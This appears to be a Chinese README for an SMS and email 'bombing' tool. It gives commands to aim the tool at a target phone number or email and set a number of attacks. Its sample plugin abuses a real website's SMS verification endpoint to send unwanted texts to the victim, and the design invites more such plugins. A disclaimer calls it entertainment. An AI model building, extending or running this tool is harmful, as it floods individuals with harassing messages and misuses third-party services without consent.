## 工具简介
这是一款针对手机号和邮箱的信息轰炸工具。
## 工具使用
+ 安装支持类库
```angular2html
pip install -r requirement.txt
```
+ 指定攻击的目标，并设置攻击次数
```angular2html
python cli -t 182****8458 -c 10
or
python cli -t test@admin.com -c 10
```
## 插件编写
`Plugin` 类继承自 `request` 库的 `Session` 类  
具有`GET`,`POST`,`PUT`,`DELETE`,`OPTION`,`request`等方法
具有`headers`,`verify`,`cookies`,`auth`,`proxies`等属性
```$xslt
:param target Type: str
:return: {'status': 利用状态, 'wait': 等待时间} Type: dict
```
+ 编写样例
```$python
# -*-* coding:UTF-8


class Plugin(Base):
    def __init__(self, *args):
        super().__init__(*args)

    def start(self, mobile: str):
        data = f'p={mobile}&type=reg'
        self.headers.update({
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest'
        })
        with self.post(f'http://www.skawang.com/home/api/sendsms.html', data=data) as r:
            if '发送成功' in r.text:
                return {'status': True, 'wait': 120}

```
## 写在最后
该程序只是娱乐使用，共同学习，如果用于非法用途，后果自负。